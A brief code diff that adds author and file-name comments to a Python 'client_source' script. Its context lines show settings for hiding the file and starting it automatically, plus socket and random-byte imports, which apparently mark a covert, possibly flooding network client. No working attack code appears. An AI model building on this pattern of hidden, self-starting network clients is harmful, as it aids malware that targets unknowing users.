@@ -6,6 +6,9 @@ buffsize = 512
 Attribute_hide = True
 Self_starting = True
 #Testing code, will be delete in generation
+# -*- coding:utf-8 -*-
+# @FileName  :client_source.py
+# @Author    :D0WE1L1N
 from socket import *
 from threading import Thread
 from random import _urandom, randint
